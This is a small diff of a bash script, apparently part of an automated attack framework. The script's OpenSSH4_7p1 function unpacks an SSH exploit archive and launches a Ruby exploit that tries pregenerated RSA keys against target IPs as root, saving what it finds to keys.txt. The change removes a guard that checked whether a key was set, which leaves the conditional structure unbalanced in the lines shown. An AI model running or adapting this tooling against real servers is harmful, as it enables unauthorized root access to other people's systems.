@@ -326,8 +326,6 @@ function OpenSSH4_7p1(){
 		tar -C $dir_path/exploits/ssh/ -xjf $dir_path/exploits/ssh/5622.tar.bz2
 		sleep 30
 	fi
-	if [ "$key" != "" ]
-	then
 	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; bash'" 2> /dev/null
